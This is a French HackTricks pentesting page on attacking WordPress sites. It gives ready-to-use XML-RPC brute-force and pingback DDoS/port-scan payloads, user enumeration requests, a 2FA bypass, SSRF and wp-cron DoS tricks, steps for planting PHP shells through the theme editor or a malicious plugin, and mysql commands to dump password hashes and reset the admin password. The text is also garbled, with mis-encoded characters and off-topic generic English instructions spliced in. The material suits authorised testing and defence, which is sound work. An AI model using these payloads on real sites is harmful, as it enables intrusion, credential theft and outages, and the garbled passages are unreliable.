# Wordpress

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour cr√©er et **automatiser des flux de travail** aliment√©s par les outils communautaires les plus avanc√©s au monde.\
Obtenez un acc√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Informations de base

Les fichiers **t√©l√©charg√©s** sont envoy√©s √† : `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`\
Les fichiers **th√®mes** peuvent √™tre trouv√©s dans /wp-content/themes/, donc si vous modifiez du code php du th√®me pour obtenir une RCE, vous utiliserez probablement ce chemin. Par exemple : En utilisant le **th√®me twentytwelve**, vous pouvez **acc√©der** au fichier **404.php** dans : [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)\
Une autre URL utile pourrait √™tre : [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

Dans **wp-config.php**, vous pouvez trouver le mot de passe root de la base de donn√©es.

Chemins de connexion par d√©faut √† v√©rifier : _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Principaux fichiers WordPress**

* `index.php`
* `license.txt` contient des informations utiles telles que la version de WordPress install√©e.
* `wp-activate.php` est utilis√© pour le processus d'activation par e-mail lors de la configuration d'un nouveau site WordPress.
* Dossiers de connexion (peuvent √™tre renomm√©s pour les masquer) :
* `/wp-admin/login.php`
* `/wp-admin/wp-login.php`
* `/login.php`
* `/wp-login.php`
* `xmlrpc.php` est un fichier qui repr√©sente une fonctionnalit√© de WordPress qui permet de transmettre des donn√©es avec HTTP en tant que m√©canisme de transport et XML en tant que m√©canisme de codage. Ce type de communication a √©t√© remplac√© par l'[API REST](https://developer.wordpress.org/rest-api/reference) de WordPress.
* Le dossier `wp-content` est le r√©pertoire principal o√π les plugins et les th√®mes sont stock√©s.
* `wp-content/uploads/` est le r√©pertoire o√π les fichiers t√©l√©charg√©s sur la plateforme sont stock√©s.
* `wp-includes/` est le r√©pertoire o√π les fichiers principaux sont stock√©s, tels que les certificats, les polices de caract√®res, les fichiers JavaScript et les widgets.

**Post-exploitation**

* Le fichier `wp-config.php` contient les informations requises par WordPress pour se connecter √† la base de donn√©es, telles que le nom de la base de donn√©es, l'h√¥te de la base de donn√©es, le nom d'utilisateur et le mot de passe, les cl√©s d'authentification et les sels, et le pr√©fixe de la table de la base de donn√©es. Ce fichier de configuration peut √©galement √™tre utilis√© pour activer le mode DEBUG, ce qui peut √™tre utile pour le d√©pannage.

### Permissions des utilisateurs

* **Administrateur**
* **√âditeur** : Publie et g√®re ses propres publications et celles des autres.
* **Auteur** : Publie et g√®re ses propres publications.
* **Contributeur** : R√©dige et g√®re ses propres publications, mais ne peut pas les publier.
* **Abonn√©** : Consulte les publications et modifie son profil.

## **√ânum√©ration passive**

### **Obtenir la version de WordPress**

V√©rifiez si vous pouvez trouver les fichiers `/license.txt` ou `/readme.html`

Dans le **code source** de la page (exemple de [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)) :

* grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
* `meta name`

![](<../../.gitbook/assets/image (343).png>)

* Fichiers de liens CSS

![](<../../.gitbook/assets/image (344).png>)

* Fichiers JavaScript

![](<../../.gitbook/assets/image (346).png>)

### Obtenir les plugins
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
To get themes for your WordPress website, you can follow these steps:

1. Go to the WordPress admin dashboard.
2. Click on "Appearance" in the left sidebar.
3. Select "Themes" from the dropdown menu.
4. You will see a list of available themes. You can browse through them or use the search bar to find a specific theme.
5. Once you find a theme you like, hover over it and click on the "Preview" button to see how it looks on your website.
6. If you are satisfied with the preview, click on the "Install" button to add the theme to your website.
7. After the theme is installed, click on the "Activate" button to make it the active theme for your website.

That's it! You have successfully obtained and installed a new theme for your WordPress website.
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Extraire les versions en g√©n√©ral

Lors de la pentest d'un site WordPress, il est important d'extraire les informations sur les versions utilis√©es. Cela peut aider √† identifier les vuln√©rabilit√©s connues et √† d√©terminer si le site est √† jour.

#### M√©thode 1 : V√©rification du fichier readme.html

Le fichier readme.html est g√©n√©ralement pr√©sent √† la racine du site WordPress. Il contient des informations sur la version actuelle de WordPress. Vous pouvez acc√©der √† ce fichier en ajoutant "/readme.html" √† l'URL du site (par exemple : `http://www.example.com/readme.html`).

#### M√©thode 2 : Analyse des en-t√™tes de r√©ponse HTTP

Lorsque vous interagissez avec un site WordPress, vous pouvez analyser les en-t√™tes de r√©ponse HTTP pour trouver des informations sur la version utilis√©e. L'en-t√™te "X-Powered-By" peut r√©v√©ler la version de WordPress. Vous pouvez utiliser des outils tels que Burp Suite pour intercepter les requ√™tes et analyser les en-t√™tes de r√©ponse.

#### M√©thode 3 : Recherche de fichiers de configuration

Certains fichiers de configuration de WordPress contiennent des informations sur la version utilis√©e. Vous pouvez rechercher des fichiers tels que "wp-config.php" et "wp-includes/version.php" pour trouver ces informations. Utilisez des outils de recherche de fichiers tels que "grep" pour faciliter cette t√¢che.

#### M√©thode 4 : Utilisation d'outils automatis√©s

Il existe des outils automatis√©s tels que WPScan qui peuvent vous aider √† extraire les informations sur les versions de WordPress. Ces outils effectuent une analyse compl√®te du site et fournissent des rapports d√©taill√©s sur les versions utilis√©es ainsi que sur les vuln√©rabilit√©s connues.

Il est recommand√© d'utiliser plusieurs m√©thodes pour extraire les informations sur les versions de WordPress afin d'obtenir des r√©sultats plus complets et pr√©cis.
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire et automatiser facilement des flux de travail aliment√©s par les outils communautaires les plus avanc√©s au monde.\
Obtenez un acc√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## √ânum√©ration active

### Plugins et th√®mes

Vous ne pourrez probablement pas trouver tous les plugins et th√®mes possibles. Pour les d√©couvrir tous, vous devrez **forcer activement une liste de plugins et de th√®mes** (heureusement, il existe des outils automatis√©s qui contiennent ces listes).

### Utilisateurs

**Brute Force de l'ID**

Vous obtenez des utilisateurs valides d'un site WordPress en for√ßant de mani√®re brutale les identifiants des utilisateurs :
```
curl -s -I -X GET http://blog.example.com/?author=1
```
Si les r√©ponses sont **200** ou **30X**, cela signifie que l'identifiant est **valide**. Si la r√©ponse est **400**, alors l'identifiant est **invalide**.

**wp-json**

Vous pouvez √©galement essayer d'obtenir des informations sur les utilisateurs en interrogeant :
```
curl http://blog.example.com/wp-json/wp/v2/users
```
**Seules les informations sur les utilisateurs ayant cette fonctionnalit√© activ√©e seront fournies**.

Notez √©galement que **/wp-json/wp/v2/pages** pourrait divulguer des adresses IP.

#### √ânum√©ration des noms d'utilisateur de connexion

Lors de la connexion √† **`/wp-login.php`**, le **message** est **diff√©rent** si le **nom d'utilisateur indiqu√© existe ou non**.

### XML-RPC

Si `xml-rpc.php` est actif, vous pouvez effectuer une attaque de force brute sur les identifiants ou l'utiliser pour lancer des attaques par d√©ni de service sur d'autres ressources. (Vous pouvez automatiser ce processus [en utilisant ceci](https://github.com/relarizky/wpxploit) par exemple).

Pour v√©rifier s'il est actif, essayez d'acc√©der √† _**/xmlrpc.php**_ et envoyez cette requ√™te :

**V√©rifier**
```markup
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Bruteforce des identifiants**

**`wp.getUserBlogs`**, **`wp.getCategories`** ou **`metaWeblog.getUsersBlogs`** sont quelques-unes des m√©thodes qui peuvent √™tre utilis√©es pour effectuer une bruteforce des identifiants. Si vous en trouvez une, vous pouvez envoyer quelque chose comme :
```markup
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
Le message _"Nom d'utilisateur ou mot de passe incorrect"_ doit appara√Ætre dans une r√©ponse de code 200 si les identifiants ne sont pas valides.

![](<../../.gitbook/assets/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (4).png>)

![](<../../.gitbook/assets/image (102).png>)

En utilisant les identifiants corrects, vous pouvez t√©l√©charger un fichier. Dans la r√©ponse, le chemin appara√Ætra ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```markup
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Il existe √©galement un moyen plus rapide de forcer les identifiants en utilisant `system.multicall`, car vous pouvez essayer plusieurs identifiants sur la m√™me requ√™te :

<figure><img src="../../.gitbook/assets/image (188).png" alt=""><figcaption></figcaption></figure>

Contourner l'authentification √† deux facteurs (2FA)

Cette m√©thode est destin√©e aux programmes et non aux humains, et elle est obsol√®te, donc elle ne prend pas en charge le 2FA. Donc, si vous avez des identifiants valides mais que l'entr√©e principale est prot√©g√©e par un 2FA, vous pourriez √™tre en mesure d'abuser de xmlrpc.php pour vous connecter avec ces identifiants en contournant le 2FA. Notez que vous ne pourrez pas effectuer toutes les actions que vous pouvez faire via la console, mais vous pourriez quand m√™me √™tre en mesure d'obtenir une RCE comme l'explique Ippsec dans [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s)

DDoS ou scan de ports

Si vous trouvez la m√©thode _**pingback.ping**_ dans la liste, vous pouvez demander √† Wordpress d'envoyer une requ√™te arbitraire √† n'importe quel h√¥te/port. Cela peut √™tre utilis√© pour demander √† des milliers de sites Wordpress d'acc√©der √† un emplacement donn√© (causant ainsi un DDoS √† cet emplacement) ou vous pouvez l'utiliser pour faire scanner Wordpress sur un r√©seau interne (vous pouvez indiquer n'importe quel port).
```markup
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../.gitbook/assets/1\_JaUYIZF8ZjDGGB7ocsZC-g.png)

Si vous obtenez **faultCode** avec une valeur **sup√©rieure** √† **0** (17), cela signifie que le port est ouvert.

Jetez un coup d'≈ìil √† l'utilisation de **`system.multicall`** dans la section pr√©c√©dente pour apprendre comment abuser de cette m√©thode pour causer une attaque DDoS.

**DDoS**
```markup
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../.gitbook/assets/image (103).png>)

### wp-cron.php DoS

Ce fichier se trouve g√©n√©ralement √† la racine du site Wordpress : **`/wp-cron.php`**\
Lorsque ce fichier est **acc√©d√©**, une requ√™te MySQL "**lourde**" est effectu√©e, ce qui peut √™tre utilis√© par les **attaquants** pour **causer** un **DoS**.\
De plus, par d√©faut, le `wp-cron.php` est appel√© √† chaque chargement de page (√† chaque fois qu'un client demande une page Wordpress), ce qui peut poser des probl√®mes (DoS) sur les sites √† fort trafic.

Il est recommand√© de d√©sactiver Wp-Cron et de cr√©er une t√¢che cron r√©elle √† l'int√©rieur de l'h√¥te qui effectue les actions n√©cessaires √† intervalles r√©guliers (sans causer de probl√®mes).

### /wp-json/oembed/1.0/proxy - SSRF

Essayez d'acc√©der √† _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ et le site Wordpress peut vous envoyer une requ√™te.

Voici la r√©ponse lorsque cela ne fonctionne pas :

![](<../../.gitbook/assets/image (184) (1).png>)

### SSRF

{% embed url="https://github.com/t0gu/quickpress/blob/master/core/requests.go" %}

Cet outil v√©rifie si la **m√©thode : pingback.ping** et le chemin **/wp-json/oembed/1.0/proxy** existent, et s'ils existent, il essaie de les exploiter.

### Outils automatiques
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire et automatiser facilement des flux de travail aliment√©s par les outils communautaires les plus avanc√©s au monde.\
Obtenez un acc√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Obtenez l'acc√®s en √©crasant un bit

Plus qu'une v√©ritable attaque, c'est une curiosit√©. Dans le CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man), vous pouvez inverser 1 bit de n'importe quel fichier WordPress. Ainsi, vous pouvez inverser la position `5389` du fichier `/var/www/html/wp-includes/user.php` pour annuler l'op√©ration NOT (`!`).
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**Modification d'un fichier php du th√®me utilis√© (identifiants d'administration requis)**

Apparence ‚Üí √âditeur de th√®me ‚Üí Mod√®le 404 (√† droite)

Modifiez le contenu pour y ajouter un shell php :

![](<../../.gitbook/assets/image (21) (1) (1).png>)

Recherchez sur internet comment acc√©der √† cette page modifi√©e. Dans ce cas, vous devez acc√©der ici : [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Vous pouvez utiliser :
```
use exploit/unix/webapp/wp_admin_shell_upload
```
## Plugin RCE

### Plugin PHP

Il est possible de t√©l√©charger des fichiers .php en tant que plugin.\
Cr√©ez votre backdoor php en utilisant par exemple :

![](<../../.gitbook/assets/image (407).png>)

Ensuite, ajoutez un nouveau plugin :

![](<../../.gitbook/assets/image (409).png>)

T√©l√©chargez le plugin et appuyez sur Installer maintenant :

![](<../../.gitbook/assets/image (411).png>)

Cliquez sur Procced :

![](<../../.gitbook/assets/image (412).png>)

Cela ne fera probablement rien en apparence, mais si vous allez dans M√©dias, vous verrez votre shell t√©l√©charg√© :

![](<../../.gitbook/assets/image (413).png>)

Acc√©dez-y et vous verrez l'URL pour ex√©cuter le reverse shell :

![](<../../.gitbook/assets/image (414).png>)

### T√©l√©chargement et activation d'un plugin malveillant

**(Cette partie est copi√©e de** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)**)**

Parfois, les utilisateurs connect√©s n'ont pas l'autorisation d'√©criture pour apporter des modifications au th√®me WordPress, nous choisissons donc "Injecter un plugin WP malveillant" comme strat√©gie alternative pour obtenir un shell web.

Ainsi, une fois que vous avez acc√®s √† un tableau de bord WordPress, vous pouvez essayer d'installer un plugin malveillant. Ici, j'ai d√©j√† t√©l√©charg√© le plugin vuln√©rable depuis exploit db.

Cliquez [**ici**](https://www.exploit-db.com/exploits/36374) pour t√©l√©charger le plugin √† des fins de pratique.

![](https://i1.wp.com/1.bp.blogspot.com/-Y\_Aw7zSFJZs/XY9pymSjdvI/AAAAAAAAguY/FGyGEzlx9VIqNYyyra9r55IklNmwXwMQwCLcBGAsYHQ/s1600/10.png?w=687\&ssl=1)

Puisque nous avons un fichier zip pour le plugin, il est temps de t√©l√©charger le plugin.

Tableau de bord > plugins > t√©l√©charger le plugin

![](https://i0.wp.com/1.bp.blogspot.com/-FLhqB0I32Mg/XY9pyrlKWAI/AAAAAAAAguU/tofpIetTCv4Mho5y5D\_sDuuokC7mDmKowCLcBGAsYHQ/s1600/11.png?w=687\&ssl=1)

Parcourez le fichier zip t√©l√©charg√© comme indiqu√©.

![](https://i2.wp.com/1.bp.blogspot.com/-KMumiwE2Tf0/XY9pzznEI4I/AAAAAAAAguk/BavBJP6plFo8NIpa38oWEKfx0jkOXv3HgCLcBGAsYHQ/s1600/12.png?w=687\&ssl=1)

Une fois que le package est install√© avec succ√®s, nous devons activer le plugin.

![](https://i2.wp.com/1.bp.blogspot.com/-YrFg94Y2EZs/XY9pzydfLDI/AAAAAAAAgug/AjZyQ6Na8kUUmquJXwoapxcmr2-8nAMwQCLcBGAsYHQ/s1600/13.png?w=687\&ssl=1)

Lorsque tout est bien configur√©, passez √† l'exploitation. Puisque nous avons install√© un plugin vuln√©rable appel√© "reflex-gallery" et qu'il est facilement exploitable.

Vous obtiendrez une exploitation de cette vuln√©rabilit√© dans le framework Metasploit, chargez donc le module ci-dessous et ex√©cutez la commande suivante :

Une fois les commandes ci-dessus ex√©cut√©es, vous aurez votre session meterpreter. Comme le montre cet article, il existe plusieurs m√©thodes pour exploiter un site web bas√© sur WordPress.

![](https://i1.wp.com/1.bp.blogspot.com/-s6Yblqj-zQ8/XY9pz0qYWAI/AAAAAAAAguo/WXgEBKIB64Ian\_RQWaltbEtdzCNpexKOwCLcBGAsYHQ/s1600/14.png?w=687\&ssl=1)

## Post-exploitation

Extraire les noms d'utilisateur et les mots de passe :
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Changer le mot de passe administrateur:

To change the admin password in WordPress, follow these steps:

1. Log in to the WordPress admin dashboard.
2. Go to the "Users" section.
3. Click on the "All Users" option.
4. Locate the admin user and click on the "Edit" link.
5. Scroll down to the "Account Management" section.
6. Enter a new password in the "New Password" field.
7. Confirm the new password in the "Repeat New Password" field.
8. Click on the "Update User" button to save the changes.

Pour changer le mot de passe administrateur dans WordPress, suivez ces √©tapes:

1. Connectez-vous au tableau de bord d'administration de WordPress.
2. Acc√©dez √† la section "Utilisateurs".
3. Cliquez sur l'option "Tous les utilisateurs".
4. Localisez l'utilisateur admin et cliquez sur le lien "Modifier".
5. Faites d√©filer jusqu'√† la section "Gestion du compte".
6. Entrez un nouveau mot de passe dans le champ "Nouveau mot de passe".
7. Confirmez le nouveau mot de passe dans le champ "R√©p√©ter le nouveau mot de passe".
8. Cliquez sur le bouton "Mettre √† jour l'utilisateur" pour enregistrer les modifications.
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Protection WordPress

### Mises √† jour r√©guli√®res

Assurez-vous que WordPress, les plugins et les th√®mes sont √† jour. V√©rifiez √©galement que la mise √† jour automatique est activ√©e dans le fichier wp-config.php :
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
De plus, **installez uniquement des plugins et des th√®mes WordPress fiables**.

### Plugins de s√©curit√©

* [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
* [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
* [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Autres recommandations**

* Supprimez l'utilisateur par d√©faut **admin**
* Utilisez des **mots de passe forts** et **l'authentification √† deux facteurs (2FA)**
* Passez en revue p√©riodiquement les **permissions** des utilisateurs
* **Limitez les tentatives de connexion** pour pr√©venir les attaques par force brute
* Renommez le fichier **`wp-admin.php`** et autorisez uniquement l'acc√®s en interne ou √† partir de certaines adresses IP.

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour cr√©er facilement et **automatiser des flux de travail** aliment√©s par les outils communautaires les plus avanc√©s au monde.\
Acc√©dez d√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
